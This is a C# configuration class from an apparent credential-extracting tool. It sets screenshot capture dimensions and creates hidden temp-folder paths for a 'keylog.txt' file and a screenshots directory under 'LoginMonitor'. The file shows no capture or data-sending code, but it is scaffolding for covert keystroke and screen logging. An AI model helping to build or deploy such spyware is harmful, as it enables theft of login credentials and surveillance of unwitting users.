// AppConfig.cs

namespace CredentialsExtractor.Configuration
{
    public class AppConfig : IAppConfig
    {
        // Screenshot settings
        public int ScreenshotStartY { get; set; } = 90;
        public int ScreenshotWidth { get; set; } = 1920;
        public int ScreenshotHeight { get; set; } = 990;

        // Application settings
        public string LogFilePath { get; set; }
        public string ScreenshotDirectory { get; set; }

        // Default constructor with sensible defaults
        public AppConfig()
        {
            LogFilePath = Path.Combine(Path.GetTempPath(), "LoginMonitor", "keylog.txt");
            ScreenshotDirectory = Path.Combine(Path.GetTempPath(), "LoginMonitor", "Screenshots");
        }
    }

    // Factory for creating configurations - Factory pattern
    public static class AppConfigFactory
    {
        public static IAppConfig LoadConfig()
        {
            AppConfig config = new AppConfig();

            // Ensure directories exist
            Directory.CreateDirectory(Path.GetDirectoryName(config.LogFilePath));
            Directory.CreateDirectory(config.ScreenshotDirectory);

            return config;
        }
    }
}